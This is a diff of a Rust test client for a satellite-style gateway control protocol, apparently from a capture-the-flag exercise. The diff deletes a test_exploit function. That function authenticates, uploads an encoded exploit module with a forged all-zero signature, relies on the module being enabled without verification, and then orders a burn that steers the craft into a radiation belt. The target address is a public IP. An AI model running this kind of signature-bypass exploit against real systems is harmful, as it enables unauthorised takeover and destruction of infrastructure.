@@ -1,7 +1,6 @@
 //! Test client.
 
 use anyhow::{anyhow, Result};
-use chrono::Utc;
 use rad_message::*;
 use ring::aead::{Aad, LessSafeKey, Nonce, UnboundKey, CHACHA20_POLY1305};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -11,73 +10,6 @@ use tokio::time::{timeout, Duration};
 // const TEST_GW_ADDR: &str = "127.0.0.1:1337";
 const TEST_GW_ADDR: &str = "165.22.0.163:1337";
 const RAD_AUTH_KEY: &[u8] = include_bytes!("../../data/rad_auth_key");
-
-#[test]
-fn test_exploit() {
-    tokio::runtime::Builder::new_multi_thread()
-        .enable_all()
-        .build()
-        .unwrap()
-        .block_on(async {
-            if let Err(e) = do_test_exploit().await {
-                panic!("{}", e);
-            }
-        });
-}
-
-const ENCODED_EXPLOIT: &[u8] = include_bytes!("../../data/encoded_exploit");
-
-async fn do_test_exploit() -> Result<()> {
-    let timeout_duration = Duration::from_secs(10);
-    let mut control = TcpStream::connect(TEST_GW_ADDR).await?;
-
-    // Authenticate
-    authenticate(&mut control).await?;
-
-    // Send the exploit payload
-    for i in 0..4 {
-        let request = ControlRequest::UpdateModule {
-            id: i,
-            module: ENCODED_EXPLOIT.to_owned(),
-            signature: vec![0x00; 64],
-            encoded: true,
-        };
-        let response = timeout(timeout_duration, send(&mut control, request)).await??;
-        if let ControlResponse::UpdateModule {
-            success,
-            verified,
-            enabled,
-            ..
-        } = response
-        {
-            assert!(!success);
-            assert!(!verified);
-            assert!(enabled);
-        } else {
-            panic!("expected update module response");
-        }
-    }
-
-    // Maneuver the craft into the inner radiation belt
-    let now = Utc::now();
-    let request = ControlRequest::Maneuver {
-        burns: vec![Burn {
-            start: now.timestamp() as _,
-            length: 255,
-            thrust: 1.0,
-            vector: (-1.0, 0.0, 0.0),
-        }],
-    };
-    let _response = timeout(timeout_duration, send(&mut control, request)).await??;
-
-    // Disconnect
-    let _response = timeout(
-        timeout_duration,
-        send(&mut control, ControlRequest::Disconnect),
-    )
-    .await??;
-    Ok(())
-}
 
 #[test]
 fn test_observe() {
